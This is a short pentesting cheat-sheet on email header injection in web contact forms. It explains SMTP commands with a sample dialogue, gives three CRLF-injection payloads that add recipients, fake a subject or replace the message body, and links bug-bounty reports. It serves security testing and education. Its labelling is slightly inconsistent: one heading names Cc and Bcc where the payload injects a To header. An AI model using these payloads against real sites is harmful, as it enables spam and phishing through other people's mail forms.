## Email Header Injection

Email header injection can happen in web contact forms that let the user send an email. If the contact form is vulnerable, an attacker can inject email headers into the email and use it for their own purposes.


Most of the time such a contact form would set SMTP headers such as `From` and `Reply-to` to make it easy for the recipient to treat communication from the contact form just like they would any other email.

## Impact
As HTML injection worked in email an attacker can trick victim to click on such hyperlinks to redirect him to any malicious site and also can host a XSS page. All this will surely cause some damage to victim. This could lead to users being tricked into giving logins away to malicious attackers.

## How SMTP Works

The SMTP protocol (Simple Mail Transfer Protocol) is one of the oldest protocols of the Internet. Originally, it just accepted a small set of commands that simply stated who the email sender is and who the recipient is

- `MAIL FROM:` This command sets the envelope sender.
- `RCPT TO:` This command sets the envelope recipient. It can be used multiple times if you want the message to reach many people at once.
- `DATA:` This command begins the email payload. The payload contains email headers and the message body separated by a single empty line.

## Here is an example of a simple SMTP dialogue:
````
> MAIL FROM:<postmaster@acunetix.com>
< 250 OK
> RCPT TO:<anna@example.com>
< 250 OK
> RCPT TO:<barbara@example.com>
< 250 OK
> DATA
< 354 Send message content; end with <CRLF>.<CRLF>
> Content-Type: text/html
> Date: Wed, 25 Dec 2019 00:00:01
> From: Santa Claus <santaclaus@acunetix.com>
> Subject: Your Gifts Are Here
> To: Not Naughty <notnaughty@example.com>
>
> Hello!
> Your gifts are here, come to the tree!
> -- 
> Santa
> .
< 250 OK
````
The above email would be received by anna@example.com and barbara@example.com. However, they would see that it was sent by Santa Claus <santaclaus@acunetix.com> (not postmaster@acunetix.com) and they would see that the recipient is Not Naughty <notnaughty@example.com>.

## How does the injection is work

Most email libraries in web programming languages usually do not let you add envelope commands directly. However, they take the email headers that you supply and often convert them into equivalent SMTP commands. For example, if you add a `BCC` header, the email library may take the content of that header and create additional `RCPT TO` commands.

## How does Cc and Bcc in SMTP work
[Refer this link](https://mailtrap.io/blog/cc-bcc-in-smtp/)

## Payload
  #### 1 - Inject Cc and Bcc after sender argument
  - `From:sender@domain.com%0ATo:attacker@domain.com`
  - The message will be sent to the original recipient from the attacker account.
  #### 2 - Inject Subject argument
  - `From:sender@domain.com%0ASubject:This is%20Fake%20Subject`
  - The fake subject will be added to the original subject and in some cases will replace it. It depends on the mail service behavior.
  #### 3  - Change the body of the message
  - `From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.`
  - Inject a two-line feed, then write your message to change the body of the message.
  
## Findings
- **1 SMTP header injection leads to (mass) arbitrary email sending
Share:** [[link]](https://hackerone.com/reports/347439)
- **2 HTML injection in email content** [[link]](https://hackerone.com/reports/786976)

## Reference
- [Acunetix](https://www.acunetix.com/blog/articles/email-header-injection/#:~:text=What%20is%20email%20header%20injection,it%20for%20their%20own%20purposes.)
- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/email-header-injection)
